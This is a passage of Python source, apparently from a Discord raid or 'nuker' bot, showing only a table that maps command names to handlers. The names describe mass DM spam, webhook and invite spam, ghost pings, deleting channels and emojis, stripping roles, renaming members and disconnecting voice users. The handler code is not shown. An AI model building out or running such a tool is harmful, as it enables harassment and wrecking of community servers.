    "dm_spam_user":cmd_dm_spam_user,"webhook_spam":cmd_webhook_spam,"server_info":cmd_server_info,
    "clone_server":cmd_clone_server,"webhook_logger":cmd_webhook_logger,"lockdown":cmd_lockdown,
    "deafen_all":cmd_deafen_all,"disconnect_all":cmd_disconnect_all,"mass_move":cmd_mass_move,
    "invite_spam":cmd_invite_spam,"spam":cmd_spam,"thread_spam":cmd_thread_spam,
    "reaction_spam":cmd_reaction_spam,"vc_spam":cmd_vc_spam,"spoiler_spam":cmd_spoiler_spam,
    "poll_spam":cmd_poll_spam,"event_spam":cmd_event_spam,
}
BotManager.ACTIONS.update({
    "del_channels":cmd_delete_channels,"del_emojis":cmd_delete_emojis,"del_stickers":cmd_delete_stickers,
    "create_categories":cmd_create_cats,"change_server":cmd_edit_server,"nick_all":cmd_rename_members,
    "dehoist_all":cmd_fix_nicks,"ghost_ping_all":cmd_ghost_ping,"remov_roles":cmd_strip_roles,
    "message_all":cmd_dm_all,"webhook_logs":cmd_webhook_logger,"sourdine_vc":cmd_deafen_all,
    "kick_vc_all":cmd_disconnect_all,"move_all_vc":cmd_mass_move,"spam_channel":cmd_spam,
    "voice_spam":cmd_vc_spam,
})
